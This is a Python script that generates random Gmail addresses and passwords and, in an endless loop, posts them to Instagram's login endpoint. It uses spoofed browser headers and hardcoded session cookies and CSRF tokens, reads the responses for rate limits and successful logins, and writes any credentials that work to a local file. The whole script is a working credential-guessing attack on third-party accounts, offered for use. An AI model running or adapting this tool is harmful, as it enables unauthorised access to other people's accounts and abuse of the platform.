import os , sys , random , requests
def create_email(data):
    xx=''
    char='asdnzncvba'
    for i in range(data):
        xx += random.choice(char)
    return xx
def create_pass(data):
    zz=''
    char='sadlkvnkxclbiq'
    for i in range(data):
        zz += random.choice(char)
    return zz
Truee='>>>> T'
Falsee='>>>> F'
while True:
 us=create_email(6) +'@gmail.com'
 ps=create_pass(6)
 reqhead = {
 'accept': '*/*',
 'accept-encoding': 'gzip, deflate, br',
 'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
 'content-length': '270',
 'content-type': 'application/x-www-form-urlencoded',
 'cookie': 'ig_did=D87B23C3-5B3E-4E03-B640-81ADE31F4CBE; ig_nrcb=1; mid=YIzJSgAEAAEPWg-NLFcjcTiz_CmQ; csrftoken=ypbLj5Ii6RJF30C2fJKcBKkVFDGyzxFz',
 'origin': 'https://www.instagram.com',
 'referer': 'https://www.instagram.com/',
 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"',
 'sec-ch-ua-mobile': '?0',
 'sec-fetch-dest': 'empty',
 'sec-fetch-mode': 'cors',
 'sec-fetch-site': 'same-origin',
 'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
 'x-csrftoken': 'ypbLj5Ii6RJF30C2fJKcBKkVFDGyzxFz',
 'x-ig-app-id': '936619743392459',
 'x-ig-www-claim': '0',
 'x-instagram-ajax': 'c1a5380865bf',
 'x-requested-with': 'XMLHttpRequest',
}
 def logns():
     lurl = 'https://www.instagram.com/accounts/login/ajax/'
     Data={
         'username': us,
         'enc_password': '# PWD_INSTAGRAM_BROWSER:10:1619841487:' +ps
     }
     rlog=requests.post(lurl, data=Data, headers=reqhead).text
     if rlog == '':
         print('Error 404 555555555 >>' +us)
     elif rlog == '{"message":"Please wait a few minutes before you try again.","status":"fail"}':
         print ('Please Wait 1m and ry Agin>> ' +us )
     elif rlog == '{"user":true,"authenticated":false,"status":"ok"}':
         print ('Feild Login >>' +us)
         print ('Please Try Agin')
     elif rlog == '{"user":true,"authenticated":true,"status":"ok"}':
         print('USER >>{} PASS >>{}'.format(us,ps))
         total=open("EM.txt" , 'a')
         total.write('\n USER={}    PASS={} '.format(us,ps))
     elif rlog == '{"user":false,"authenticated":false,"status":"ok"}':
         print ('FEILD LOGIN....!')
     
 logns()